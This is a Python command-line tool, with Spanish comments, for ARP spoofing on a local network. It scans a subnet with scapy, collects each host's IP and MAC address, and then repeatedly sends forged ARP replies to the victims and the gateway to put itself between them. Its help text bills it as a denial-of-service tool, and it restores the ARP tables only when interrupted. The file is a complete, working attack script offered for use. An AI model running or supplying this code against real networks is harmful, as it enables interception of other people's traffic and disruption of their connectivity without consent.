# /usr/bin/python3
# -*- coding: utf-8 -*-

__file__ = 'ARP Spoofing'
__autor__ = 'Desmon'

from logging import getLogger, ERROR, basicConfig, DEBUG

getLogger("scapy.runtime").setLevel(ERROR) # Que no muestre warning
basicConfig(level=DEBUG, format='%(threadName)s: %(message)s')


from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import send, srp

from colorama.ansi      import clear_screen, AnsiCursor
from colorama           import Fore, Back, init

from argparse           import ArgumentParser
from sys                import argv, stdout
import time

from getpass import _raw_input

Cursor = AnsiCursor()

colors = {
    "BLACK": "\033[30m",
    "RED": "\033[31m",
    "GREEN": "\033[32m",
    "YELLOW": "\033[33m",
    "BLUE": "\033[34m",
    "MAGENTA": "\033[35m",
    "CYAN": "\033[36m",
    "WHITE": "\033[37m",
    "RESET": "\033[39m",

    "LIGHTBLACK_EX": "\033[90m",
    "LIGHTRED_EX": "\033[91m",
    "LIGHTGREEN_EX": "\033[92m",
    "LIGHTYELLOW_EX": "\033[93m",
    "LIGHTBLUE_EX": "\033[94m",
    "LIGHTMAGENTA_EX": "\033[95m",
    "LIGHTCYAN_EX": "\033[96m",
    "LIGHTWHITE_EX": "\033[97m",
}


def Carga():

    def UP(n=1):
        return '\033[' + str(n) + 'A'

    def DOWN(n=1):
        return '\033[' + str(n) + 'B'

    def FORWARD(n=1):
        return '\033[' + str(n) + 'C'

    def BACK(n=1):
        return '\033[' + str(n) + 'D'

    def POS(x=1, y=1):
        return '\033[' + str(y) + ';' + str(x) + 'H'

    # cambiar el titulo de la terminal
    print("\033]2;=== AtackARP - cargando ===\007")
    print("\033[3J\033[H\033[2J")

    print(f"\n{Fore.LIGHTGREEN_EX}      [")
    for arch in range(7, 108):
        time.sleep(0.01)
        print(f"{Cursor.UP(1)}{Cursor.FORWARD(arch)}{Fore.LIGHTYELLOW_EX}=>")
        print(f"{Cursor.UP(1)}{Fore.LIGHTWHITE_EX}{str(arch-7)}%")
    print(f"{Cursor.UP(1)}{Cursor.FORWARD(arch)}{Fore.LIGHTGREEN_EX}]")
    print(f'{Cursor.POS(25, 5)}{Fore.YELLOW}\t---------------------------------')
    print(f'{Cursor.POS(26, 6)}{Fore.CYAN  }\t>>> {Fore.LIGHTYELLOW_EX}Proceso Carga Finalizado {Fore.CYAN}<<<')
    print(f'{Cursor.POS(25, 7)}{Fore.YELLOW}\t---------------------------------{Fore.RESET}')



def get_mac(gateway: str) -> str:               # esta fun obtendra la direcion MAC
    """
        Esta funcion permite obtener la direccion MAC de un equipo
        apartir de la direccion IP.
    Args:
        gateway (str): Direccion IP a la que enviar el paquete ARP

    Returns:
        str: Direccion MAC en tipo string.
    """
    print("Obteniendo la direcion MAC\n")
    
    # creando una solicitud ARP a la dirección IP
    arp_layer = ARP(pdst=gateway)               # pdst = ip destino a mandar un paquete ARP
    
    # dst  = direccion MAC a enviar el paquete, en este caso la direccion es broadcast
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")  
    
    # combinando el paquete ARP con el mensaje de difusión
    final_packet = broadcast/arp_layer          
    
    # srp mandara el packete y esperara a recibir uno, srp recibe el packete finalizado, 
    # timeout=2 establece 2 segundos de espera, verbose=True activa los mensajes por 
    # pantalla del proceso, esta func retornara una lista, la posicion 0 es la mac
    mac = srp(final_packet, timeout=2, verbose=True)[0] # se accede solo al result
    
    print("\n")
    mac.rawhexdump()
    print("\n")
    mac.show()
    print("\ndatos recibidos: " + str(mac[0])+"\t\n")
    return mac[0][1].hwsrc # retornar la direccion MAX

cantidad = 0

def print_list_hosts(gateway, lista_hosts):
    cantidad = 0
    print(clear_screen()+Cursor.POS(0,0))
    for ip_mac in lista_hosts:
        if ip_mac[0] != gateway:
            cantidad += 1
            spaces = (15-len(ip_mac[0])) * " "
            print(f"{Fore.LIGHTWHITE_EX}[{Fore.CYAN}{cantidad}{Fore.LIGHTWHITE_EX}] ", end="")
            print(f"{Fore.LIGHTYELLOW_EX}HOST{Fore.LIGHTWHITE_EX}: ", end="")
            new_lines = cantidad * '\n'
            print(f"{Fore.LIGHTYELLOW_EX}{ip_mac[0]} {spaces} {Fore.LIGHTMAGENTA_EX}MAC{Fore.LIGHTWHITE_EX}: {Fore.LIGHTMAGENTA_EX}{ip_mac[1]}{Fore.RESET}{new_lines}")


def scann_net(rango, gateway):  # este escaneara toda la red.
    print("Conezando el escaneo\n")
    lista_hosts = list()
    # esto crearia un packete que se enviaria a toda la red
    arp_layer = ARP(pdst=rango)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    final_packet = broadcast/arp_layer
    answers = srp(final_packet, timeout=2, verbose=True)[0]

    cantidad = 0

    for a in answers:
        if a != gateway:
            cantidad += 1
            spaces = (15-len(a[1].psrc)) * " "
            print(f"{Fore.LIGHTWHITE_EX}[{Fore.CYAN}{cantidad}{Fore.LIGHTWHITE_EX}] ", end="")
            print(f"{Fore.LIGHTYELLOW_EX}HOST{Fore.LIGHTWHITE_EX}: ", end="")
            print(f"{Fore.LIGHTYELLOW_EX}{a[1].psrc} {spaces} {Fore.LIGHTMAGENTA_EX}MAC{Fore.LIGHTWHITE_EX}: {Fore.LIGHTMAGENTA_EX}{a[1].hwsrc}{Fore.RESET}")
            lista_hosts.append([a[1].psrc, a[1].hwsrc])

    delete = _raw_input(f"\n{Fore.LIGHTWHITE_EX}[{Fore.LIGHTGREEN_EX}*{Fore.LIGHTWHITE_EX}]{Fore.RESET} Desea eliminar alguna direcion IP/MAC ({Fore.LIGHTGREEN_EX}Y{Fore.RESET}/{Fore.LIGHTRED_EX}N{Fore.RESET})?: ")
    if delete.upper() == "Y":
        while True:
            try:
                delete = _raw_input(f"\033[1A{Fore.LIGHTWHITE_EX}[{Fore.LIGHTBLUE_EX}*{Fore.LIGHTWHITE_EX}] Introduce el numero de la ip a eliminar, para salir del bucle introduzca 0: ")
                if int(delete) > cantidad:
                    print("{}[{}+{}]este numero no esta registrado: "+str(delete)+"".format(
                        colors["LIGHTWHITE_EX"], colors["LIGHTRED_EX"], colors["LIGHTWHITE_EX"]))
                    pass
                elif int(delete) == 0:
                    break
                else:
                    print("\033[1B"+80*" ")
                    print("\033[1ASe elimino correctamente: {}\033[1A\033[1A".format(
                        lista_hosts[int(delete)-1]))
                    lista_hosts.pop(int(delete)-1)
                    print_list_hosts(gateway, lista_hosts)
                    pass
            except ValueError:
                print(f"{AnsiCursor.UP(2)}{Fore.LIGHTRED_EX}[{Fore.LIGHTYELLOW_EX}!{Fore.LIGHTRED_EX}]{Fore.LIGHTYELLOW_EX} No es un valor decimal valido{80*' '}", end=f"{Fore.RESET}\n")
                time.sleep(2)
        for i in range(2):
            print("\033[1B"+80*" ")
        print(6*"\033[1A")
    elif delete.upper() == "N":
        pass
    else:
        print("\033[1A{}[{}+{}] Por defecto no se eliminara ninguna IP/MAC\n\n".format(
            colors["LIGHTWHITE_EX"], colors["LIGHTMAGENTA_EX"], colors["LIGHTWHITE_EX"]))

    p = 0

    for e in lista_hosts:
        if e == "":
            lista_hosts.pop(p)
        p += 1
    del (p)
    if lista_hosts == ['', ''] or lista_hosts == ['']:
        print("{}[{}-{}] Usted elimino todos los posibles objetivos".format(
            colors["LIGHTWHITE_EX"], colors["LIGHTRED_EX"], colors["LIGHTWHITE_EX"]))
        exit(1)
    return lista_hosts


# restaurara las tablas ARP, si no se hace la conexion se cortaria generando una  Denegacion De Servicio(DOS)
def restore_arp(destip, sourceip, hwsrc, hwdst):
    # la restauracion de las tablas ARP se realizara despues del ataque.
    dest_mac = hwdst  # MAC destino
    source_mac = hwsrc
    # destip=ip destino, psrc=ip origen, hwsrc=direcion MAC origen
    packet = ARP(op=2, pdst=destip, hwdst=dest_mac,
                 psrc=sourceip, hwsrc=source_mac)
    # packet[0].rawhexdump()
    send(packet, verbose=True)  # envio del packete sin esperar respuesta
    return 1


def arp_spoofing(hwdst: str, pdst: str, psrc: str):
    """
        Aquí, el paquete ARP se configura como respuesta y
        pdst se configura como la IP de destino,
        ya sea para la víctima o el enrutador. hwdst
        es la dirección MAC de la IP proporcionada
        y psrc es la dirección IP de suplantación
        para manipular el paquete.

    Args:
        hwdst (str): MAC destino
        pdst  (str): IP  destino
        psrc  (str): IP origen
    """
    
    spoofer_packet = ARP(op=2, hwdst=hwdst, pdst=pdst, psrc=psrc)
    spoofer_packet.show2()
    spoofer_packet.display()
    send(spoofer_packet, verbose=True, return_packets=True)


def main():
    init()
    
    # recibira parametros desde la linea de comandos
    parse = ArgumentParser(
        prog = __doc__,
                    description = f"""
                        {Fore.GREEN}Arp Spoof Float DOS.{Fore.RESET}
                    """,
                    epilog="""
                    """
    )
    parse.add_argument("-r", "--range",   help=f"{Fore.CYAN}Rango a escanear y spoofear{Fore.RESET}")
    parse.add_argument("-g", "--gateway", help=f"{Fore.CYAN}puerta de enlaze o router{Fore.RESET}")  # 192.168.1.1
    
    if len(argv) != 1: 
        parse = parse.parse_args()  # fin de la instanciazion.
        Carga()
    
    # True si el usuario introducio todo los parametros.
    #if parse.range and parse.gateway:
        print("\033]2;=== AtackARP - obteniendo MACs ===\007")
        mac_gateway = get_mac(parse.gateway)
        print("\033]2;=== AtackARP - escaneando ===\007")
        hosts = scann_net(parse.range, parse.gateway)
        p = 0

        for e in hosts:
            if e == "":
                hosts.pop(p)
            p += 1

        time.sleep(3)
        try:
            print("\n{}[{}*{}] Corriendo ...".format(colors["LIGHTWHITE_EX"],
                  colors["LIGHTGREEN_EX"], colors["LIGHTWHITE_EX"]))
            print("{}[{}*{}] Para finalizar el ataque pulse Ctrl + c".format(
                colors["LIGHTWHITE_EX"], colors["LIGHTYELLOW_EX"], colors["LIGHTWHITE_EX"]))
            print("\033]2;=== AtackARP - atacando ===\007")
            while True:
                for i in range(0, len(hosts)):
                    mac_target = hosts[i][1]
                    ip_target = hosts[i][0]
                    gateway = parse.gateway
                    # packete para el dispositivo victima
                    arp_spoofing(mac_gateway, gateway, ip_target)
                    # packete para el router
                    arp_spoofing(mac_target, ip_target, gateway)

                    print("\033["+str(32+len(hosts)+i)+";1H{}[{}+{}] Subplantando a: {}".format(
                        colors["LIGHTWHITE_EX"], colors["LIGHTGREEN_EX"], colors["LIGHTWHITE_EX"], ip_target))
                    stdout.flush()

        except KeyboardInterrupt:
            print("\033]2;=== AtackARP - Restaurando tablas ARP ===\007")
            print("\n\nRestaurando tablas ARP")
            for i in hosts:
                mac_target = i[1]
                ip_target = i[0]
                gateway = parse.gateway
                restore_arp(gateway, ip_target, mac_gateway, mac_target)
                restore_arp(ip_target, gateway, mac_target, mac_gateway)
            exit(0)

    else:
        parse.print_help()
        exit(1)


if __name__ == "__main__":
    main()
